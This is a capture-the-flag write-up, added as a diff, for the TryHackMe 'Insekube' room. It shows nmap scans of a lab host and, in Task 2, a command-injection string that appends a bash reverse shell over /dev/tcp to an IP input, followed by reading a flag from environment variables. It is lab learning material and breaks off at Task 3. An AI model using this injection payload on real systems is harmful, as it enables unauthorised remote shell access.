@@ -1,0 +1,47 @@
+# TryHackMe - Insekube
+
+[Room link](https://tryhackme.com/room/insekube)
+
+--- 
+
+ ## Task 1
+ 
+ 1. What ports are open? (comma separated)
+  
+**No aswer required**
+
+```bash
+# Fast scan all ports
+$ nmap -sT -p- -T4 10.10.40.83
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+# Scan details
+$ nmap -sC -sV -p22,80 -oN nmap_22-80.txt 10.10.40.83
+
+```
+
+--- 
+
+## Task 2
+
+To get reverse shell, start a listener nc on your machine (nc -lnvp 4444 for example) and put in the box the following string : 
+127.0.0.1;bash -i >& /dev/tcp/<your_ip>/4444 0>&1
+
+1. What is flag 1?
+
+```bash
+$ env | grep -i flag
+$ env | grep -i flag
+FLAG=flag{XXXX}
+```
+
+---
+
+## Task 3
+
+Install kubectl following the instructions. 
+
+1.
+
